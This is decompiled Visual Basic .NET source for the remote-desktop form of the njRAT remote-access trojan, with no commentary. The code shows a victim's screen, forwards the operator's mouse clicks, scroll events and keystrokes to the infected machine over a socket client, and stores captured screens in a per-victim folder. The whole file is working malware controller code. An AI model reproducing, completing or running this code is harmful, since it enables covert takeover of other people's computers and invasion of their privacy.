Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x02000025 RID: 37
	<DesignerGenerated()>
	Public Partial Class sc
		Inherits Form

		' Token: 0x17000102 RID: 258
		' (get) Token: 0x0600030A RID: 778 RVA: 0x0001C421 File Offset: 0x0001A621
		' (set) Token: 0x0600030B RID: 779 RVA: 0x0001C42B File Offset: 0x0001A62B
		Friend Overridable Property Panel1 As Panel

		' Token: 0x17000103 RID: 259
		' (get) Token: 0x0600030C RID: 780 RVA: 0x0001C434 File Offset: 0x0001A634
		' (set) Token: 0x0600030D RID: 781 RVA: 0x0001C440 File Offset: 0x0001A640
		Friend Overridable Property CheckBox1 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox1_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox1
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, value2
				End If
				Me._CheckBox1 = value
				checkBox = Me._CheckBox1
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000104 RID: 260
		' (get) Token: 0x0600030E RID: 782 RVA: 0x0001C483 File Offset: 0x0001A683
		' (set) Token: 0x0600030F RID: 783 RVA: 0x0001C490 File Offset: 0x0001A690
		Friend Overridable Property CheckBox2 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox2_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox2
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, value2
				End If
				Me._CheckBox2 = value
				checkBox = Me._CheckBox2
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000105 RID: 261
		' (get) Token: 0x06000310 RID: 784 RVA: 0x0001C4D3 File Offset: 0x0001A6D3
		' (set) Token: 0x06000311 RID: 785 RVA: 0x0001C4E0 File Offset: 0x0001A6E0
		Friend Overridable Property CheckBox3 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox3
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, value2
				End If
				Me._CheckBox3 = value
				checkBox = Me._CheckBox3
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000106 RID: 262
		' (get) Token: 0x06000312 RID: 786 RVA: 0x0001C523 File Offset: 0x0001A723
		' (set) Token: 0x06000313 RID: 787 RVA: 0x0001C52D File Offset: 0x0001A72D
		Friend Overridable Property ComboBox1 As ComboBox

		' Token: 0x17000107 RID: 263
		' (get) Token: 0x06000314 RID: 788 RVA: 0x0001C536 File Offset: 0x0001A736
		' (set) Token: 0x06000315 RID: 789 RVA: 0x0001C540 File Offset: 0x0001A740
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000108 RID: 264
		' (get) Token: 0x06000316 RID: 790 RVA: 0x0001C583 File Offset: 0x0001A783
		' (set) Token: 0x06000317 RID: 791 RVA: 0x0001C58D File Offset: 0x0001A78D
		Friend Overridable Property Label1 As Label

		' Token: 0x17000109 RID: 265
		' (get) Token: 0x06000318 RID: 792 RVA: 0x0001C596 File Offset: 0x0001A796
		' (set) Token: 0x06000319 RID: 793 RVA: 0x0001C5A0 File Offset: 0x0001A7A0
		Friend Overridable Property vmethod_16 As Timer
			<CompilerGenerated()>
			Get
				Return Me._vmethod_16
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_16_Tick
				Dim vmethod_ As Timer = Me._vmethod_16
				If vmethod_ IsNot Nothing Then
					RemoveHandler vmethod_.Tick, value2
				End If
				Me._vmethod_16 = value
				vmethod_ = Me._vmethod_16
				If vmethod_ IsNot Nothing Then
					AddHandler vmethod_.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700010A RID: 266
		' (get) Token: 0x0600031A RID: 794 RVA: 0x0001C5E3 File Offset: 0x0001A7E3
		' (set) Token: 0x0600031B RID: 795 RVA: 0x0001C5F0 File Offset: 0x0001A7F0
		Friend Overridable Property vmethod_12 As Timer
			<CompilerGenerated()>
			Get
				Return Me._vmethod_12
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_12_Tick
				Dim vmethod_ As Timer = Me._vmethod_12
				If vmethod_ IsNot Nothing Then
					RemoveHandler vmethod_.Tick, value2
				End If
				Me._vmethod_12 = value
				vmethod_ = Me._vmethod_12
				If vmethod_ IsNot Nothing Then
					AddHandler vmethod_.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700010B RID: 267
		' (get) Token: 0x0600031C RID: 796 RVA: 0x0001C633 File Offset: 0x0001A833
		' (set) Token: 0x0600031D RID: 797 RVA: 0x0001C63D File Offset: 0x0001A83D
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x1700010C RID: 268
		' (get) Token: 0x0600031E RID: 798 RVA: 0x0001C646 File Offset: 0x0001A846
		' (set) Token: 0x0600031F RID: 799 RVA: 0x0001C650 File Offset: 0x0001A850
		Friend Overridable Property p As PictureBox
			<CompilerGenerated()>
			Get
				Return Me._p
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As MouseEventHandler = AddressOf Me.p_MouseDown
				Dim value3 As EventHandler = AddressOf Me.p_MouseEnter
				Dim value4 As EventHandler = AddressOf Me.p_MouseLeave
				Dim value5 As MouseEventHandler = AddressOf Me.p_MouseMove
				Dim value6 As MouseEventHandler = AddressOf Me.p_MouseUp
				Dim value7 As MouseEventHandler = AddressOf Me.p_MouseWheel
				Dim value8 As PaintEventHandler = AddressOf Me.p_Paint
				Dim value9 As EventHandler = AddressOf Me.p_Resize
				Dim p As PictureBox = Me._p
				If p IsNot Nothing Then
					RemoveHandler p.MouseDown, value2
					RemoveHandler p.MouseEnter, value3
					RemoveHandler p.MouseLeave, value4
					RemoveHandler p.MouseMove, value5
					RemoveHandler p.MouseUp, value6
					RemoveHandler p.MouseWheel, value7
					RemoveHandler p.Paint, value8
					RemoveHandler p.Resize, value9
				End If
				Me._p = value
				p = Me._p
				If p IsNot Nothing Then
					AddHandler p.MouseDown, value2
					AddHandler p.MouseEnter, value3
					AddHandler p.MouseLeave, value4
					AddHandler p.MouseMove, value5
					AddHandler p.MouseUp, value6
					AddHandler p.MouseWheel, value7
					AddHandler p.Paint, value8
					AddHandler p.Resize, value9
				End If
			End Set
		End Property

		' Token: 0x1700010D RID: 269
		' (get) Token: 0x06000320 RID: 800 RVA: 0x0001C770 File Offset: 0x0001A970
		' (set) Token: 0x06000321 RID: 801 RVA: 0x0001C77C File Offset: 0x0001A97C
		Friend Overridable Property Button2 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click
				Dim button As Button = Me._Button2
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button2 = value
				button = Me._Button2
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000322 RID: 802 RVA: 0x0001C7C0 File Offset: 0x0001A9C0
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.sc_FormClosing
			AddHandler MyBase.Load, AddressOf Me.sc_Load
			AddHandler MyBase.ResizeBegin, AddressOf Me.sc_ResizeBegin
			AddHandler MyBase.ResizeEnd, AddressOf Me.sc_ResizeEnd
			Me.QQ = String.Empty
			Me.Oimg = Nothing
			Me.point_0 = Nothing
			Me.point_1 = Nothing
			Me.co = 0
			Me.Folder = String.Empty
			Me.point_2 = New Point(30, 30)
			Me.IsActive = False
			Me.fps = 0
			Me.int_0 = 0
			Me.dbf = 0L
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000323 RID: 803 RVA: 0x0001C890 File Offset: 0x0001AA90
		Public Sub KDW(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
			If Not flag Then
				Me.p.Focus()
				Dim checked As Boolean = Me.CheckBox2.Checked
				If checked Then
					Dim keyCode As Keys = e.KeyCode
					If keyCode <> Keys.ShiftKey AndAlso keyCode - Keys.LShiftKey > 1 AndAlso keyCode <> Keys.Shift Then
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
					Else
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(16) }))
					End If
				End If
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x06000324 RID: 804 RVA: 0x0001C99C File Offset: 0x0001AB9C
		Public Sub KUP(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
			If Not flag Then
				Me.p.Focus()
				Dim checked As Boolean = Me.CheckBox2.Checked
				If checked Then
					Dim keyCode As Keys = e.KeyCode
					If keyCode <> Keys.ShiftKey AndAlso keyCode - Keys.LShiftKey > 1 AndAlso keyCode <> Keys.Shift Then
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
					Else
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(16) }))
					End If
				End If
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x06000325 RID: 805 RVA: 0x0001CAA8 File Offset: 0x0001ACA8
		Private Sub p_MouseDown(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As Object = p
			SyncLock obj
				Dim flag As Boolean = Me.CheckBox1.Checked AndAlso Operators.CompareString(Me.Button1.Text, "Start", False) <> 0
				If flag Then
					Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
					Dim flag2 As Boolean = e.Button = MouseButtons.Left
					Dim value As Integer
					If flag2 Then
						value = 2
					End If
					Dim flag3 As Boolean = e.Button = MouseButtons.Right
					If flag3 Then
						value = 8
					End If
					Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
				End If
			End SyncLock
		End Sub

		' Token: 0x06000326 RID: 806 RVA: 0x0001CC0C File Offset: 0x0001AE0C
		Private Sub p_MouseEnter(sender As Object, e As EventArgs)
			Me.IsActive = True
		End Sub

		' Token: 0x06000327 RID: 807 RVA: 0x0001CC16 File Offset: 0x0001AE16
		Private Sub p_MouseLeave(sender As Object, e As EventArgs)
			Me.IsActive = False
		End Sub

		' Token: 0x06000328 RID: 808 RVA: 0x0001CC20 File Offset: 0x0001AE20
		Private Sub p_MouseMove(sender As Object, e As MouseEventArgs)
			Me.point_2 = e.Location
			Dim flag As Boolean = Me.point_2.Y < 20
			If flag Then
				Me.Button2.Visible = True
			Else
				Me.Button2.Visible = False
			End If
			Dim p As PictureBox = Me.p
			Dim obj As Object = p
			SyncLock obj
				Dim flag2 As Boolean = (Not Me.p.Focused And Me.CheckBox2.Checked) Or Me.CheckBox1.Checked
				If flag2 Then
					Me.p.Focus()
				End If
			End SyncLock
		End Sub

		' Token: 0x06000329 RID: 809 RVA: 0x0001CCD4 File Offset: 0x0001AED4
		Private Sub p_MouseUp(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = Me.CheckBox1.Checked AndAlso Operators.CompareString(Me.Button1.Text, "Start", False) <> 0
			If flag Then
				Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
				Dim flag2 As Boolean = e.Button = MouseButtons.Left
				Dim value As Integer
				If flag2 Then
					value = 4
				End If
				Dim flag3 As Boolean = e.Button = MouseButtons.Right
				If flag3 Then
					value = 16
				End If
				Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
			End If
		End Sub

		' Token: 0x0600032A RID: 810 RVA: 0x0001CE00 File Offset: 0x0001B000
		Private Sub p_MouseWheel(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As Object = p
			SyncLock obj
				Dim flag As Boolean = Me.CheckBox1.Checked AndAlso Operators.CompareString(Me.Button1.Text, "Start", False) <> 0
				If flag Then
					Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(e.Delta), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(2048) }))
				End If
			End SyncLock
		End Sub

		' Token: 0x0600032B RID: 811 RVA: 0x0001CED0 File Offset: 0x0001B0D0
		Private Sub p_Paint(sender As Object, e As PaintEventArgs)
			Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(Me.pkt)
			Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
			Dim flag As Boolean = Not(Me.point_2.X < size.Width And Me.point_2.Y < size.Height)
			If flag Then
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(New Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect)
				Dim brush As Brush = Brushes.Red
				Dim flag2 As Boolean = Me.int_0 > 3
				If flag2 Then
					brush = Brushes.YellowGreen
				End If
				Dim flag3 As Boolean = Me.int_0 > 6
				If flag3 Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			End If
		End Sub

		' Token: 0x0600032C RID: 812 RVA: 0x0001CFDC File Offset: 0x0001B1DC
		Private Sub p_Resize(sender As Object, e As EventArgs)
			Me.Button2.Left = CInt(Math.Round(Math.Round(CDbl(Me.p.Width) / 2.0 - CDbl(Me.Button2.Width) / 2.0)))
			Me.Button2.Top = Me.p.Top + 3
		End Sub

		' Token: 0x0600032D RID: 813 RVA: 0x0001D048 File Offset: 0x0001B248
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				Me.Button1.Text = "Start"
				Me.sk.Send("!!")
				Me.ComboBox1.Enabled = True
			Else
				Me.ComboBox1.Enabled = False
				Me.Button1.Text = "Stop"
				Dim num As Single = CSng((Conversions.ToDouble(Me.ComboBox1.Text.Remove(0, 1)) / 100.0))
				Dim size As Size = New Size(CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Width) * num / 10F))))) * 10, CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Height) * num / 10F))))) * 10)
				Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Me.sk.ip(), Class7.string_1, Conversions.ToString(size.Width), "x", Conversions.ToString(size.Height), Class7.string_1, "0" }))
			End If
		End Sub

		' Token: 0x0600032E RID: 814 RVA: 0x0001D1AC File Offset: 0x0001B3AC
		Private Sub vmethod_16_Tick(sender As Object, e As EventArgs)
			Me.vmethod_12.Enabled = False
			Dim flag As Boolean = Not Me.osk.CN Or Not Me.sk.CN
			If flag Then
				Me.sk.CN = False
				Me.Panel1.Enabled = False
				Me.Text = "Disconnected!! " + Me.QQ
				MyBase.Close()
			Else
				Me.int_0 = Me.fps
				Me.fps = 0
				Dim flag2 As Boolean = Me.int_0 = 0
				If flag2 Then
					Me.pkt = 0L
					Me.p.Invalidate()
				End If
				Me.vmethod_12.Enabled = True
			End If
		End Sub

		' Token: 0x0600032F RID: 815 RVA: 0x0000C421 File Offset: 0x0000A621
		Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000330 RID: 816 RVA: 0x0001D268 File Offset: 0x0001B468
		Private Sub vmethod_12_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
			Dim point As Point = MyBase.PointToClient(Cursor.Position)
			Dim flag As Boolean = point.X > -1 And point.Y > -1 And Me.IsActive
			If flag Then
				Me.point_0 = New Point(CInt(Math.Round(Math.Round(CDbl(point.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(point.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
				Dim flag2 As Boolean = (Me.CheckBox1.Checked And Operators.CompareString(Me.Button1.Text, "Start", False) <> 0) AndAlso Me.point_0 <> Me.point_1
				If flag2 Then
					Me.point_1 = Me.point_0
					Dim client As Client = Me.sk
					Dim text As String = String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(Me.point_1.X), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(1) })
					client.SEND_(Class6.smethod_11(text))
				End If
			End If
		End Sub

		' Token: 0x06000331 RID: 817 RVA: 0x0001D3E0 File Offset: 0x0001B5E0
		Private Sub sc_FormClosing(sender As Object, e As FormClosingEventArgs)
			Dim flag As Boolean = Me.sk IsNot Nothing
			If flag Then
				Me.sk.CN = False
			End If
		End Sub

		' Token: 0x06000332 RID: 818 RVA: 0x0001D40C File Offset: 0x0001B60C
		Private Sub sc_Load(sender As Object, e As EventArgs)
			Try
				Dim p As PictureBox = Me.p
				Dim obj As Object = p
				SyncLock obj
					Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
					Me.Text = Me.QQ
					Dim p2 As Control = Me.p
					AddHandler p2.KeyUp, AddressOf Me.KUP
					AddHandler p2.KeyDown, AddressOf Me.KDW
					Me.ComboBox1.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0)
				End SyncLock
				Me.Folder = Me.osk.Folder + "Screen\"
				Dim flag As Boolean = Not Directory.Exists(Me.Folder)
				If flag Then
					Directory.CreateDirectory(Me.Folder)
				End If
				Dim bool_ As Boolean = Class7.class8_0.bool_6
				If bool_ Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender)), e)
				End If
				Dim flag2 As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) <> 0
				If flag2 Then
					Me.Button2_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender)), e)
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000333 RID: 819 RVA: 0x0001D590 File Offset: 0x0001B790
		Private Sub sc_ResizeBegin(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As Object = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x06000334 RID: 820 RVA: 0x0001D5CC File Offset: 0x0001B7CC
		Private Sub sc_ResizeEnd(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As Object = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x06000335 RID: 821 RVA: 0x0001D608 File Offset: 0x0001B808
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Panel1.Visible
			If flag Then
				Me.Panel1.Visible = True
				Me.Button2.BackgroundImage = Resources.bullet_arrow_up
			Else
				Me.Panel1.Visible = False
				Me.Button2.BackgroundImage = Resources.bullet_arrow_down
			End If
		End Sub

		' Token: 0x06000336 RID: 822 RVA: 0x0001D66C File Offset: 0x0001B86C
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.CheckBox3.Checked
			If checked Then
				Try
					Process.Start(Me.Folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000337 RID: 823 RVA: 0x0000C421 File Offset: 0x0000A621
		Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x040001BC RID: 444
		Public co As Integer

		' Token: 0x040001BD RID: 445
		Public dbf As Long

		' Token: 0x040001BE RID: 446
		Public Folder As String

		' Token: 0x040001BF RID: 447
		Public fps As Integer

		' Token: 0x040001C0 RID: 448
		Private int_0 As Integer

		' Token: 0x040001C1 RID: 449
		Public IsActive As Boolean

		' Token: 0x040001C2 RID: 450
		Public Oimg As Bitmap

		' Token: 0x040001C3 RID: 451
		Public osk As Client

		' Token: 0x040001C4 RID: 452
		Public pkt As Long

		' Token: 0x040001C5 RID: 453
		Private point_0 As Point

		' Token: 0x040001C6 RID: 454
		Private point_1 As Point

		' Token: 0x040001C7 RID: 455
		Private point_2 As Point

		' Token: 0x040001C8 RID: 456
		Public QQ As String

		' Token: 0x040001C9 RID: 457
		Public sk As Client

		' Token: 0x040001CA RID: 458
		Public sz As Size
	End Class
End Namespace
